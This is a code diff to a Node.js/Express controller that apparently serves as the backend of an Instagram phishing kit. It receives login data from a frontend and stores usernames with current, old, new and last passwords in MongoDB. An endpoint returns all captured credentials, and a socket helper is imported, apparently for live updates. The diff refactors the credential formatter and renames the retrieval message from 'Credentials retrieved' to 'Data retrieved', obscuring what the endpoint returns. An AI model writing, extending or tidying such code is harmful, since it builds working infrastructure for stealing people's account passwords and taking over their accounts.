@@ -3,17 +3,23 @@ const { getIo } = require('../config/socket');
 const { sendSuccess, sendFailure } = require('../utils/response');
 
 /* ── Helper: map a MongoDB document to the frontend shape ────────────────── */
-const formatEntry = (entry) => ({
-  id: entry._id.toString(),
-  service: (entry.source || 'Instagram').toLowerCase(),
-  username: entry.username,
-  type: entry.path || 'login',
-  at: entry.createdAt ? entry.createdAt.toISOString() : new Date().toISOString(),
-  password: entry.password || null,
-  oldPassword: entry.oldPassword || null,
-  newPassword: entry.newPassword || null,
-  lastPassword: entry.lastPassword || null,
-});
+const formatEntry = (entry) => {
+  const base = {
+    id: entry._id.toString(),
+    service: (entry.source || 'Instagram').toLowerCase(),
+    username: entry.username,
+    type: entry.path || 'login',
+    at: entry.createdAt ? entry.createdAt.toISOString() : new Date().toISOString(),
+  };
+
+  // Only include password fields that are actually set
+  if (entry.password) base.password = entry.password;
+  if (entry.oldPassword) base.oldPassword = entry.oldPassword;
+  if (entry.newPassword) base.newPassword = entry.newPassword;
+  if (entry.lastPassword) base.lastPassword = entry.lastPassword;
+
+  return base;
+};
 
 /**
  * @desc    Receive Instagram login data from frontend and store to DB
@@ -67,10 +73,7 @@ const instagramLogin = async (req, res) => {
       res,
       'Login data saved successfully',
       {
-        id: entry._id,
-        username: entry.username,
-        source: entry.source,
-        path: entry.path,
+        id: entry._id.toString(),
         time: entry.time,
         createdAt: entry.createdAt,
       },
@@ -90,7 +93,7 @@ const getAllCredentials = async (req, res) => {
   try {
     const entries = await InstaLogin.find().sort({ createdAt: -1 });
     const credentials = entries.map(formatEntry);
-    return sendSuccess(res, 'Credentials retrieved', { credentials });
+    return sendSuccess(res, 'Data retrieved', { credentials });
   } catch (error) {
     return sendFailure(res, error.message || 'Internal Server Error', 500);
   }
